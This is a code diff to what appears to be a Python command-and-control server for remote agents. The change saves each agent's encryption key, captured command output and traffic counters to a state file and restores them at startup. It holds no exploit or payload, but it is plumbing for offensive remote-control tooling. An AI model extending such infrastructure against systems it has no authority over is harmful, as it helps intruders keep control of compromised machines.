@@ -175,13 +175,66 @@ def save_state():
     try:
         with open(STATE_FILE, "w") as f:
             json.dump(
-                {aid: {"registered": a["registered"].isoformat(),
-                       "outputs":    len(a["output_history"])}
-                 for aid, a in agents.items()},
+                {
+                    aid: {
+                        "key":            a["key"].hex(),
+                        "last_seen":      a["last_seen"].isoformat(),
+                        "registered":     a["registered"].isoformat(),
+                        "output_history": [
+                            {
+                                "timestamp": entry["timestamp"].isoformat(),
+                                "output":    entry["output"],
+                            }
+                            for entry in a["output_history"]
+                        ],
+                        "last_output":    a["last_output"],
+                        "command_count":  a["command_count"],
+                        "bytes_sent":     a["bytes_sent"],
+                        "bytes_received": a["bytes_received"],
+                    }
+                    for aid, a in agents.items()
+                },
                 f, indent=2
             )
     except Exception as e:
         async_log(f"State save failed: {e}", "err")
+
+
+def load_state():
+    if not os.path.exists(STATE_FILE):
+        return
+
+    try:
+        with open(STATE_FILE, "r") as f:
+            data = json.load(f)
+
+        for aid, state in data.items():
+            try:
+                agents[aid] = {
+                    "key":            bytes.fromhex(state["key"]),
+                    "last_seen":      datetime.fromisoformat(state["last_seen"]),
+                    "registered":     datetime.fromisoformat(state["registered"]),
+                    "output_history": [
+                        {
+                            "timestamp": datetime.fromisoformat(entry["timestamp"]),
+                            "output":    entry["output"],
+                        }
+                        for entry in state.get("output_history", [])
+                    ],
+                    "last_output":    state.get("last_output", ""),
+                    "command_count":  state.get("command_count", 0),
+                    "bytes_sent":     state.get("bytes_sent", 0),
+                    "bytes_received": state.get("bytes_received", 0),
+                }
+                command_queue[aid] = None
+            except Exception as e:
+                async_log(f"Failed to restore agent {aid[:8]}: {e}", "warn")
+
+        if agents:
+            async_log(f"Restored {len(agents)} agent(s) from {STATE_FILE}", "ok")
+    except Exception as e:
+        async_log(f"Failed to load state: {e}", "err")
+
 
 def new_agent(key: bytes) -> dict:
     return {
@@ -604,6 +657,7 @@ if __name__ == "__main__":
     os.makedirs(BOF_DIR,    exist_ok=True)
     os.makedirs(UPLOAD_DIR, exist_ok=True)
 
+    load_state()
     banner()
 
     def _flask():
